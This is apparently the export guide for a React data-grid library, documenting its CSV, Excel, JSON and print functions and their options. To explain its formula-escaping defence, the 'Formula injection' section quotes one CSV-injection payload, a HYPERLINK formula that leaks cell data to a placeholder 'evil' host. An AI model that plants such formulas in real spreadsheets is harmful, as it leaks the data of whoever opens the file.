# Export Functionality Guide

The DataGrid provides built-in export utilities for multiple formats. The standard exports (CSV, JSON, Print, basic Excel) have **zero dependencies**. The advanced Excel export uses [ExcelJS](https://github.com/exceljs/exceljs) loaded lazily.

## Available Export Formats

| Format | Function | Deps | Description |
|---|---|---|---|
| CSV | `exportToCsv` | none | Comma-separated values |
| Excel (basic) | `exportToExcel` | none | HTML-table `.xls` trick |
| **Excel (advanced)** | `exportToExcelAdvanced` | ExcelJS (lazy) | Real `.xlsx` with styles, types, multi-sheet |
| JSON | `exportToJson` | none | Structured JSON |
| Print | `printGrid` | none | Browser print dialog |

---

## Quick Start

```tsx
import { exportToCsv, exportToExcel, exportToExcelAdvanced, exportToJson, printGrid } from '@opencorestack/opengridx';

// CSV
exportToCsv(rows, columns, { fileName: 'data.csv' });

// Basic Excel (no deps) — an HTML table that Excel opens as a legacy .xls
exportToExcel(rows, columns, { fileName: 'data.xls' });

// Advanced Excel (ExcelJS, lazy-loaded)
await exportToExcelAdvanced(rows, columns, { fileName: 'data.xlsx' });

// JSON
exportToJson(rows, columns, { fileName: 'data.json', pretty: true });

// Print
printGrid(rows, columns, 'My Report');
```

---

## 1. `exportToCsv`

```tsx
import { exportToCsv } from '@opencorestack/opengridx';

exportToCsv(rows, columns, {
  fileName: 'employees.csv',
  includeHeaders: true,
  delimiter: ',',
  selectedRows: [1, 2, 3],           // export only these IDs
  aggregationResult: aggResult,       // adds two rows: function labels (SUM/AVG), then values
  aggregationModel: { salary: 'sum' },
});
```

**`CsvExportOptions`:**

| Option | Type | Default | Description |
|---|---|---|---|
| `fileName` | `string` | `'export.csv'` | Output filename |
| `includeHeaders` | `boolean` | `true` | Include column header row |
| `delimiter` | `string` | `','` | Field delimiter. Values that contain it (or a quote, LF or CR) are quoted |
| `selectedRows` | `(string\|number)[]` | — | Export only these row IDs. See [Selection, grouping and totals](#selection-grouping-and-totals) |
| `aggregationResult` | `object \| null` | — | Appends two rows after the data: a function-label row (`SUM`, `AVG`…) then a values row |
| `aggregationModel` | `object \| null` | — | Labels for aggregation row |
| `groupedRows` | `GridGroupedExportRow[]` | — | Grouped structure from `apiRef.current.getGroupedExportRows()` |
| `getRowId` | `(row) => GridRowId` | `row.id` | The grid's `getRowId`, needed with `selectedRows` when rows are keyed by another field (v3.0+) |
| `escapeFormulas` | `boolean` | `true` | Prefix text that starts with `=`, `+`, `-`, `@`, tab or CR with `'` (v3.0+). See [Formula injection](#formula-injection) |
| `bom` | `boolean` | `true` | Start the file with a UTF-8 byte-order mark so Excel reads non-ASCII text (v3.0+) |

### Formula injection

Spreadsheet apps run any cell that starts with `=`, `+`, `-` or `@` as a formula, so user-entered text such as `=HYPERLINK("http://evil/?"&A2,"Click")` can leak data or run commands when someone opens the export ("CSV injection"). Since v3.0, `exportToCsv` and `exportToExcel` prefix such text — in cells, headers and group labels — with `'`, which makes it plain text. Plain signed numbers (`-12.50`) and text formatted from a number, date or boolean value are left alone. Pass `escapeFormulas: false` only when every exported value is trusted and you need live formulas.

---

## 2. `exportToExcel` (basic)

HTML-table approach, no external libraries. Opens reliably in Excel and Numbers but as a legacy `.xls` format. Excel refuses HTML content named `.xlsx`, so since v3.0 a `.xlsx` file name is renamed to `.xls` (with a console warning); use [`exportToExcelAdvanced`](#3-exporttoexceladvanced--recommended) for a real `.xlsx`. Text cells are marked as text (`mso-number-format:"\@"`), so Excel keeps leading zeros (`00501`), long ids and strings like `1-2` as they are; number, date and boolean columns are left for Excel to type.

```tsx
import { exportToExcel } from '@opencorestack/opengridx';

exportToExcel(rows, columns, {
  fileName: 'report.xls',
  sheetName: 'Data',
  includeHeaders: true,
  aggregationResult: aggResult,
  aggregationModel: { salary: 'sum' },
});
```

**`ExcelExportOptions`:**

| Option | Type | Default | Description |
|---|---|---|---|
| `fileName` | `string` | `'export.xls'` | Output filename (`.xlsx` is renamed to `.xls`) |
| `sheetName` | `string` | `'Sheet1'` | Sheet tab name. Characters Excel rejects (`\ / ? * : [ ]`) become `-`; cut to 31 characters |
| `includeHeaders` | `boolean` | `true` | Include column header row |
| `selectedRows` | `(string\|number)[]` | — | Export only these row IDs. See [Selection, grouping and totals](#selection-grouping-and-totals) |
| `aggregationResult` | `object \| null` | — | Appends two rows after the data: a function-label row (`SUM`, `AVG`…) then a values row |
| `aggregationModel` | `object \| null` | — | Labels for aggregation row |
| `groupedRows` | `GridGroupedExportRow[]` | — | Grouped structure from `apiRef.current.getGroupedExportRows()` |
| `getRowId` | `(row) => GridRowId` | `row.id` | The grid's `getRowId`, needed with `selectedRows` when rows are keyed by another field (v3.0+) |
| `escapeFormulas` | `boolean` | `true` | Prefix formula-like text with `'` (v3.0+). See [Formula injection](#formula-injection) |

---

## 3. `exportToExcelAdvanced` ⭐ (recommended)

Generates a **real `.xlsx`** file using ExcelJS, loaded lazily (zero bundle-size impact unless called).

```tsx
import { exportToExcelAdvanced } from '@opencorestack/opengridx';

// Simple — single sheet, all defaults
await exportToExcelAdvanced(rows, columns, {
  fileName: 'employees.xlsx',
});

// Full options — multi-sheet, custom styles
await exportToExcelAdvanced(rows, columns, {
  fileName: 'full-report.xlsx',

  sheets: [
    {
      name: 'All Employees',
      rows: 'all',              // or 'selected'
      includeHeaders: true,
      includeSummary: true,     // aggregation totals at bottom
      autoFilter: true,         // dropdown filter buttons in header
      frozenHeader: true,       // freeze row 1
      alternateRowColor: '#f8fafc',
    },
    {
      name: 'Selected Rows',
      rows: 'selected',
      includeHeaders: true,
    },
    {
      type: 'summary',          // standalone aggregation sheet
      name: 'Aggregation',
    },
  ],

  columnStyles: {
    salary:  { numFmt: '$#,##0.00', alignment: 'right' },
    bonus:   { numFmt: '$#,##0.00', alignment: 'right' },
    percent: { numFmt: '0.00%' },
    joinDate:{ numFmt: 'yyyy-mm-dd' },
  },

  headerFillColor: '#1e3a5f',   // header row background
  headerTextColor: '#e2e8f0',   // header row text
  headerFontSize: 11,
  bodyFontSize: 10,

  aggregationResult: aggResult,
  aggregationModel: { salary: 'sum', bonus: 'sum', score: 'avg' },
  selectedRows: rowSelectionModel,
});
```

### `ExcelAdvancedExportOptions`

| Option | Type | Default | Description |
|---|---|---|---|
| `fileName` | `string` | `'export.xlsx'` | Output filename (`.xlsx` appended if missing) |
| `sheets` | `ExcelSheetDefinition[]` | `[{ name: 'Data', rows: 'all' }]` | Sheet definitions |
| `columnStyles` | `Record<string, ExcelColumnStyle>` | `{}` | Per-column style overrides |
| `headerFillColor` | `string` | `'#f1f5f9'` | Header row background (`#rrggbb`) |
| `headerTextColor` | `string` | `'#334155'` | Header row text color |
| `headerFontSize` | `number` | `10` | Header font size (pt) |
| `bodyFontSize` | `number` | `10` | Body font size (pt) |
| `aggregationResult` | `object \| null` | — | Aggregation totals |
| `aggregationModel` | `object \| null` | — | Aggregation function labels |
| `selectedRows` | `(string\|number)[]` | — | IDs for `rows: 'selected'` sheets. With no selection, such a sheet has only its header row (v3.0+) |
| `getRowId` | `(row) => GridRowId` | `row.id` | The grid's `getRowId`, needed with `selectedRows` when rows are keyed by another field (v3.0+) |
| `groupedRows` | `GridGroupedExportRow[]` | — | Grouped structure from `apiRef.current.getGroupedExportRows()` (v2.1+). See [Grouped export](#grouped-export-to-advanced-excel) |
| `groupHeaderFillColor` | `string` | `'#e8eaf6'` | Group-header row fill (grouped export) |
| `groupSubtotalFillColor` | `string` | `'#f0f4ff'` | Group-subtotal row fill (grouped export) |

### `ExcelSheetDefinition`

| Option | Type | Default | Description |
|---|---|---|---|
| `name` | `string` | — | Sheet tab name. Characters Excel rejects (`\ / ? * : [ ]`) become `-`, the name is cut to 31 characters, and a duplicate name (case-insensitive, also between two `summary` sheets) gets a ` (2)` suffix (v3.0+) |
| `rows` | `'all' \| 'selected'` | `'all'` | Which rows to include. `'selected'` writes only `selectedRows`, none when nothing is selected |
| `includeHeaders` | `boolean` | `true` | Include column header row |
| `includeSummary` | `boolean` | `false` | Aggregation totals rows at bottom. On a `'selected'` sheet the totals are recomputed over the selected rows |
| `autoFilter` | `boolean` | `true` | Excel filter dropdowns on header |
| `frozenHeader` | `boolean` | `true` | Freeze row 1 |
| `alternateRowColor` | `string \| false` | `'#f8fafc'` | Odd-row fill. `false` to disable |

### `ExcelColumnStyle`

| Option | Type | Description |
|---|---|---|
| `numFmt` | `string` | Excel number format, e.g. `'$#,##0.00'`, `'0.00%'`, `'yyyy-mm-dd'`. Defaults: `type: 'number'` cells get `'#,##0'` for whole numbers and `'#,##0.##'` otherwise; `type: 'date'` gets `'yyyy-mm-dd'` |
| `width` | `number` | Column width in characters (overrides auto) |
| `alignment` | `'left' \| 'center' \| 'right'` | Horizontal alignment |
| `embedImage` | `boolean` | If true, the cell's URL (after `valueGetter`) is fetched and embedded as an image. PNG, JPEG and GIF are embedded (detected from the bytes); other formats (SVG, WebP, AVIF) and failed fetches write the URL text instead |
| `imageWidth` | `number` | Width of embedded image (px, default: 40) |
| `imageHeight`| `number` | Height of embedded image (px, default: 40) |

### Grouped export to advanced Excel

Since v2.1, pass the grid's grouped structure to keep number formats, styling and summary sheets on grouped reports:

```tsx
await exportToExcelAdvanced(rows, columns, {
  fileName: 'sales-by-region.xlsx',
  groupedRows: apiRef.current.getGroupedExportRows() ?? undefined,
  aggregationModel,
  aggregationResult: apiRef.current.getAggregationResult(),
  columnStyles: { amount: { numFmt: '$#,##0.00' } },
});
```

Sheets with `rows: 'all'` are written in grouped order: a bold group-header row (the same label the grid shows — see [Group labels in exports](#group-labels-in-exports)), the leaf rows, a `Subtotal` row per group, and a final `Grand Total`. Rows use Excel's native outlining, so users can collapse groups in Excel. Subtotal and total values are written as numbers so `columnStyles[field].numFmt` applies — except `count` and `unique`, which are plain integers (`'#,##0'`) rather than, say, a currency or date, and `min` / `max` of a date column, which are written as dates. When the first column has its own aggregate, its value is written instead of the `Subtotal` label. A `grand-total` entry replaces the sheet's `includeSummary` rows, so totals are not duplicated. `rows: 'selected'` sheets ignore `groupedRows` and export flat.

### Group labels in exports

Every exporter (CSV, basic Excel, JSON, print, PDF and advanced Excel) writes the same group-header label the grid shows on screen:

1. the entry's `groupLabel` — set by `apiRef.current.getGroupedExportRows()` from the grid's own label;
2. else the grouping column's `groupingValueFormatter`;
3. else `"field: value"`, the grid's documented default.

Before v3.0, only advanced Excel applied `groupingValueFormatter` (falling back to `"Header: value"`), and the other formats always wrote `"field: value"`.

### Summary Sheet

Pass `{ type: 'summary', name: 'My Sheet' }` in `sheets` to add a standalone aggregation sheet. Values are numeric cells (v3.0+; they were locale-formatted text before) in the column's `numFmt`, so with `columnStyles: { salary: { numFmt: '$#,##0' } }`:

```
| Column       | Function | Value     |
|--------------|----------|-----------|
| Salary       | SUM      | $8,320,000|
| Bonus        | SUM      | $1,040,000|
| Perf. Score  | AVG      | 3.7       |
```

The flat `includeSummary` totals row is numeric in the same way.

### Cell types

`exportToExcelAdvanced` writes native cells so Excel can sort, filter and sum them:

| Column / value | Written as |
|---|---|
| `type: 'number'` — numbers, and numeric strings such as `'42.50'` | Number |
| `type: 'boolean'` — booleans, and `'true'` / `'false'` strings | Boolean |
| `type: 'date'` — `Date`, epoch milliseconds, and ISO strings (`'2024-01-15'`, `'2024-01-15T10:30'`) | Date, with the same calendar day and wall-clock time the grid shows in the user's timezone |
| A value that is not of the column's type (`'n/a'` in a number column) | The `valueFormatter` text, else the value as text |
| `NaN`, `Infinity`, Invalid Date, `null` | Empty cell (or the `valueFormatter` text, which also runs for missing values) |
| Objects and arrays | JSON text. Objects are never handed to ExcelJS as-is, so `{ formula }`, `{ hyperlink }`, `{ richText }` or `{ error }` row data cannot become live formulas or links |
| Anything else | The `valueFormatter` text, else the value |

### Feature Comparison: Basic vs Advanced

| Feature | `exportToExcel` | `exportToExcelAdvanced` |
|---|---|---|
| True `.xlsx` format | ❌ HTML trick | ✅ |
| Native number cells | ❌ text | ✅ |
| Native date cells | ❌ text | ✅ |
| Native boolean cells | ❌ text | ✅ |
| Number format strings | ❌ | ✅ |
| Bold / colored header | ❌ CSS ignored | ✅ |
| Column widths | ❌ | ✅ auto from `colDef.width` |
| Frozen header row | ❌ | ✅ |
| Auto-filter dropdowns | ❌ | ✅ |
| Alternating row colors | ❌ | ✅ |
| Multi-sheet workbooks | ❌ | ✅ |
| Aggregation totals row | Inline text | ✅ styled |
| Standalone summary sheet | ❌ | ✅ |
| Bundle impact | Zero | Zero (lazy-loaded) |

---

## 4. `exportToJson`

```tsx
import { exportToJson } from '@opencorestack/opengridx';

exportToJson(rows, columns, {
  fileName: 'data.json',
  pretty: true,
  aggregationResult: aggResult,
  aggregationModel,
  selectedRows: [1, 2, 3],
});
```

JSON is a data format, so values are written raw: `valueGetter` is applied, `valueFormatter` is not.

When `aggregationResult` is provided, output shape becomes:
```json
{
  "data": [...],
  "aggregation": {
    "labels": { "salary": "SUM" },
    "values": { "salary": 8320000 }
  }
}
```

`aggregation.values` are the raw results (numbers). Before v3.0 they were locale-formatted strings such as `"8,320,000"`. With `groupedRows`, the output is `{ groups, grandTotal }`, and `subtotals` / `grandTotal` contain only exported columns (an `exportable: false` column's totals are left out, v3.0+).

**`JsonExportOptions`:**

| Option | Type | Default | Description |
|---|---|---|---|
| `fileName` | `string` | `'export.json'` | Output filename |
| `pretty` | `boolean` | `true` | Pretty-print with indentation |
| `selectedRows` | `(string\|number)[]` | — | Export only these row IDs |
| `getRowId` | `(row) => GridRowId` | `row.id` | The grid's `getRowId`, needed with `selectedRows` when rows are keyed by another field (v3.0+) |
| `aggregationResult` | `object \| null` | — | Append aggregation object |
| `aggregationModel` | `object \| null` | — | Function labels |
| `groupedRows` | `GridGroupedExportRow[]` | — | Grouped structure; output becomes a nested `{ groups, grandTotal }` tree |

---

## 5. `printGrid`

Opens a browser print dialog with a formatted table.

```tsx
import { printGrid } from '@opencorestack/opengridx';

// Simple
printGrid(rows, columns, 'Employee Report');

// With options
printGrid(rows, columns, {
  title: 'Q1 Report',
  selectedRows: [1, 2, 3],
  aggregationResult: aggResult,
  aggregationModel,
});
```

**`PrintOptions`:**

| Option | Type | Description |
|---|---|---|
| `title` | `string` | Print page title |
| `selectedRows` | `(string\|number)[]` | Print only these row IDs. See [Selection, grouping and totals](#selection-grouping-and-totals) |
| `aggregationResult` | `object \| null` | Append totals |
| `aggregationModel` | `object \| null` | Label totals |
| `groupedRows` | `GridGroupedExportRow[]` | Grouped structure from `apiRef.current.getGroupedExportRows()` |
| `getRowId` | `(row) => GridRowId` | The grid's `getRowId`, needed with `selectedRows` when rows are keyed by another field (v3.0+) |

The print window is a same-origin popup, so every value written into it — title, cells, headers, group labels, image URLs and alt text, error messages — is HTML-escaped. `type: 'image'` columns render an `<img>` only for `http(s):`, `data:image/…`, `blob:` and relative URLs; any other value (e.g. `javascript:…`) is printed as text.

---

## Common Patterns

### Export with toolbar integration

`GridToolbar` has no built-in export action; render your own button with `renderExportButton`. Pass it through `slotProps.toolbar` rather than wrapping `GridToolbar` in an inline `slots.toolbar` function: the grid hands its filter, column and aggregation handlers to the slot component, and a wrapper that drops them leaves the toolbar without its search, Filters, Columns and Summaries controls.

```tsx
import { useState } from 'react';
import {
  DataGrid, GridToolbar, exportToExcelAdvanced,
  type GridColDef, type GridRowModel, type GridRowSelectionModel,
} from '@opencorestack/opengridx';

function MyGrid({ rows, columns }: { rows: GridRowModel[]; columns: GridColDef[] }) {
  const [selected, setSelected] = useState<GridRowSelectionModel>([]);

  return (
    <DataGrid
      rows={rows}
      columns={columns}
      checkboxSelection
      rowSelectionModel={selected}
      onRowSelectionModelChange={setSelected}
      slots={{ toolbar: GridToolbar }}
      slotProps={{
        toolbar: {
          renderExportButton: () => (
            <button
              onClick={() => exportToExcelAdvanced(rows, columns, {
                fileName: 'report.xlsx',
                sheets: [{ name: 'Selected', rows: 'selected' }],
                selectedRows: selected,
              })}
            >
              Export to Excel
            </button>
          ),
        },
      }}
    />
  );
}
```

### Multi-sheet with selection

```tsx
await exportToExcelAdvanced(rows, columns, {
  fileName: 'report.xlsx',
  sheets: [
    { name: 'All Data',      rows: 'all',      includeSummary: true },
    { name: 'Selected',      rows: 'selected', includeSummary: false },
    { type: 'summary',       name: 'Totals' },
  ],
  selectedRows: rowSelectionModel,
  aggregationResult: aggResult,
  aggregationModel: { salary: 'sum', bonus: 'sum' },
});
```

### Respect `valueFormatter` for styled columns

The advanced export keeps **raw values** for typed columns (`number`, `date`, `boolean`) so Excel can format them natively with `numFmt`. For `string` columns, `valueFormatter` is applied before writing.

```tsx
const columns: GridColDef[] = [
  {
    field: 'salary',
    type: 'number',             // ← raw number written to Excel
    valueFormatter: ({ value }) => `$${(value as number).toLocaleString()}`, // used in CSV/print
  },
];

await exportToExcelAdvanced(rows, columns, {
  columnStyles: {
    salary: { numFmt: '$#,##0.00' },  // ← Excel formats the native number
  },
});
```

---

## Value Formatters

Every exporter applies `valueGetter`. CSV, basic Excel, print and PDF write the `valueFormatter` text, as the grid does — since v3.0 the formatter also runs for `null` / `undefined` values, so placeholder text such as `'Unassigned'` or `'—'` is exported (a formatter that throws for a missing value exports an empty cell). JSON writes raw values, and advanced Excel writes typed columns natively (see the note below):

```tsx
const columns: GridColDef[] = [
  {
    field: 'fullName',
    valueGetter: ({ row }) => `${row.firstName} ${row.lastName}`,
  },
  {
    field: 'salary',
    valueFormatter: ({ value }) => `$${(value as number).toLocaleString()}`,
  },
];
```

> **Note:** In `exportToExcelAdvanced`, `valueFormatter` is only applied for `string`-typed columns. For `number`/`date`/`boolean` columns, raw values are passed to Excel and formatted via `columnStyles.numFmt`; the formatter is used only for values that are missing or not of the column's type (see [Cell types](#cell-types)).

### Aggregate values

Subtotal, grand-total and totals cells are formatted the same way in every text format (CSV, basic Excel, print, PDF):

- `count` and `unique` are plain counts formatted like the grid footer (`1,234`); the column's `valueFormatter` is not applied, because a count of a currency column is not an amount.
- `sum`, `avg`, `min` and `max` go through the column's `valueFormatter`. Its `row` argument is the record of aggregated values (like the grid's group rows), not a data row; if the formatter throws, the value is formatted like the grid footer instead of aborting the export. `min` / `max` of a `type: 'date'` column reach the formatter as a `Date`.
- When the first exported column has its own aggregate, its value is kept next to the label (`Subtotal: 300`, `TOTAL: $30.00`) instead of being overwritten.

---

## Excluding Columns

You can exclude specific columns (e.g., action buttons or menus) from all export formats using the `exportable` property in the column definition. A few fields are also excluded automatically. Every other column you pass is exported, including hidden ones: pass `apiRef.current.getVisibleColumns()` to export what is on screen.

| Method | Description |
|---|---|
| `exportable: false` | Set in `GridColDef` to manually exclude any column |
| `__check__` | Native checkbox column (auto-excluded) |
| `__actions__` | Common field for action buttons (auto-excluded) |
| `isSpacer: true` | Spacer columns (auto-excluded from every format since v3.0; before, only advanced Excel skipped them) |

### Example
```tsx
const columns: GridColDef[] = [
  { field: 'id', headerName: 'ID' },
  { field: 'name', headerName: 'Name' },
  { 
    field: 'actions', 
    headerName: 'Actions', 
    exportable: false // This column won't appear in CSV/Excel/JSON/PDF/Print
  },
];
```

---

## Selection, grouping and totals

Every exporter follows the same rules (v3.0+):

- **`selectedRows`** exports only the rows with those IDs, picked from the `rows` you pass. Pass all rows plus `selectedRows` rather than pre-filtering, so the exporter knows a selection was applied.
- **A non-empty selection takes precedence over `groupedRows`**: the selected rows are exported flat. (Before v3.0, CSV, basic Excel, JSON, print and PDF silently ignored the selection and exported every grouped row.) In `exportToExcelAdvanced`, `rows: 'selected'` sheets are flat and `rows: 'all'` sheets use `groupedRows`.
- **Totals follow the exported rows.** The grid's `aggregationResult` covers all filtered rows; when a selection narrows the export, the totals row is recomputed over the selected rows with the grid's own aggregation functions (it needs `aggregationModel`). Without a selection, `aggregationResult` is written as given — if you pass a subset of rows yourself (e.g. the current page), pass totals computed for that subset.
- Row selection is linear in the number of rows, so exporting "select all" on a large grid does not freeze the tab.
- **With a custom `getRowId`, pass it as the `getRowId` option.** `selectedRows` holds the grid's ids, and since v3.0 the grid no longer copies them onto `row.id`, so without the option a row that keeps its id in another field (or whose `id` field is not the key) is not matched.
- **`getGroupedExportRows()` exports every group**, collapsed or not, sorted and filtered like the screen; groups with no row left after the filter are omitted, and each subtotal is computed over the rows exported under it (v3.0+).

---

## Performance Notes

| Format | 10k rows | 100k rows |
|---|---|---|
| CSV | ~50ms | ~500ms |
| JSON | ~80ms | ~800ms |
| Excel (basic) | ~200ms | ~2s |
| Excel (advanced) | ~300ms | ~3s |
| Print | Best with paginated data | — |

---

## Browser Compatibility

All export functions work in:
- ✅ Chrome/Edge 90+
- ✅ Firefox 88+
- ✅ Safari 14+

---

## See Also

- [PDF Export](./pdf-export.md)
- [Toolbar Customization](./toolbar-customization.md)
- [Demo: Export Data](../../demo/examples/ExportDemo/ExportDemo.tsx)
- [Demo: Advanced Excel Export](../../demo/examples/AdvancedExcelExportDemo/AdvancedExcelExportDemo.tsx)
- [Slots API Reference](../customization/slots-api.md)
- [Theming Guide](../customization/theming.md)
